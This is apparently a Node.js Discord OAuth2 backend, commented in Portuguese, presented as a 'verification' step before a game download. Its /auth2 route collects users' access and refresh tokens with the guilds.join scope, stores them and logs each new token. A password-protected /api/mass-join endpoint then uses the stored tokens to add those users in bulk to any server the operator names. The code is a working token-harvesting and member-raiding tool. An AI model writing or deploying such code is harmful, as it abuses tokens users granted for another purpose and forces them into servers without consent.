require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; // Link final
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// --- BANCO DE DADOS ---
let pool = null;
async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: { rejectUnauthorized: false }
        });
        try {
            await pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id VARCHAR(255) PRIMARY KEY, username VARCHAR(255), access_token TEXT, refresh_token TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);`);
            console.log('✅ Banco conectado.');
        } catch (err) { console.error("❌ Erro banco:", err); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// =================================================================
// ROTA DE VERIFICAÇÃO /AUTH2 (O que você pediu)
// =================================================================
app.get('/auth2', async (req, res) => {
    const { code, state } = req.query; 
    
    // Se não vier código, o Discord não enviou direito
    if (!code) return res.send('Erro: Falta código de autorização.');

    try {
        // 1. Troca o Código pelo Token
        // O redirect_uri aqui TEM que ser o próprio link /auth2
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI_2, 
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        // 2. Salva no Banco (SQL)
        if (pool) {
            await pool.query(`
                INSERT INTO auth_users (id, username, access_token, refresh_token)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (id) 
                DO UPDATE SET access_token = $3, refresh_token = $4;
            `, [user.id, user.username, access_token, refresh_token]);
        }

        // 3. Tenta dar o Cargo (Auth2 Vetificados)
        // O ID do servidor vem no 'state' se o seu outro site mandou ele
        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) await member.roles.add(role);
                }
            } catch (e) { console.error("Erro ao dar cargo:", e.message); }
        }

        // 4. Log no Discord
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token (Via Site Externo)').setDescription(`**Usuário:** ${user.username}`).setColor('Green')] });
        }

        // 5. Redirecionamento Rápido (0.3s) para o seu site de Sucesso
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verificado</title>
                <style>body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column}.spinner{width:50px;height:50px;border:5px solid rgba(255,255,255,0.1);border-top:5px solid #23a559;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
            </head>
            <body>
                <div class="spinner"></div>
                <p>Verificando...</p>
                <script>
                    setTimeout(() => { window.location.href = "${REDIRECT_TARGET_GAME}"; }, 300);
                </script>
            </body>
            </html>
        `);

    } catch (e) { 
        console.error(e.response ? e.response.data : e.message);
        res.send('Erro na autenticação. Verifique se o REDIRECT_URI_2 no Render está igual ao link configurado no seu site externo e no Discord.'); 
    }
});

// =================================================================
// OUTRAS ROTAS (Status, Painel Admin, API Mass Join)
// =================================================================
app.get('/', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
    res.send(`<body style="background:#1e1f22;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column"><h1>🤖 Backend Auth Online</h1><p>Tokens: <b>${count}</b></p><a href="/painel" style="color:#5865F2">Painel Admin</a></body>`);
});

app.get('/painel', async (req, res) => {
    let count = 0;
    if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
    res.send(`<!DOCTYPE html><html><body style="background:#2b2d31;color:white;font-family:sans-serif;display:flex;justify-content:center;padding-top:50px"><div style="background:#313338;padding:40px;border-radius:8px;width:400px"><h2>Painel Admin</h2><p>Membros: ${count}</p><form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha" style="width:100%;margin-bottom:10px"><input type="text" name="serverId" placeholder="ID Servidor" style="width:100%;margin-bottom:10px"><input type="number" name="amount" placeholder="Qtd" style="width:100%;margin-bottom:10px"><button type="submit" style="width:100%;background:#23a559;color:white;border:none;padding:10px;cursor:pointer">Enviar</button></form></div></body></html>`);
});

app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if (password !== ADMIN_PASSWORD) return res.send('Senha Incorreta');
    if (!pool) return res.send('Erro Banco');
    let users = [];
    try { const result = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = result.rows; } catch(e) { return res.send('Erro busca'); }
    if (users.length === 0) return res.send('Vazio');
    res.send('Iniciado.');
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let s=0, f=0;
    for (const user of users) {
        try { await axios.put(`https://discord.com/api/guilds/${serverId}/members/${user.id}`, { access_token: user.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); s++; } 
        catch (e) { if(e.response?.status===401) pool.query('DELETE FROM auth_users WHERE id=$1',[user.id]).catch(()=>{}); f++; }
        await sleep(1000);
    }
});

// --- BOT DISCORD (Apenas liga para manter conexão e dar cargos) ---
client.once('ready', () => console.log(`🤖 Bot Logado: ${client.user.tag}`));
iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
    client.login(process.env.BOT_TOKEN);
});
